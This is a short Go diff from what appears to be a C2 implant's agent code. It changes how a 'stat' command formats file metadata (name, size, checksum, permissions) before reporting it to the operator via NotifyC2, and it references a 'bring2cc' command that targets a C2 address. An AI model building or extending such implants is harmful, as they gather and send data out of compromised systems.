@@ -105,12 +105,7 @@ func runStat(cmd *cobra.Command, args []string) {
 		Checksum:   crypto.SHA256SumFile(path),
 		Permission: fi.Mode().String(),
 	}
-	data, err := cbor.Marshal(fstat)
-	if err != nil {
-		c2transport.NotifyC2(cmd, "Error: cant marshal file info %s: %v\n", path, err)
-		return
-	}
-	c2transport.NotifyC2(cmd, "%s", string(data))
+	c2transport.NotifyC2(cmd, "Name: %s\nSize: %d\nChecksum: %s\nPermission: %s", fstat.Name, fstat.Size, fstat.Checksum, fstat.Permission)
 }
 
 // runBring2CC implements !bring2cc --addr <target> --kcp <on/off>
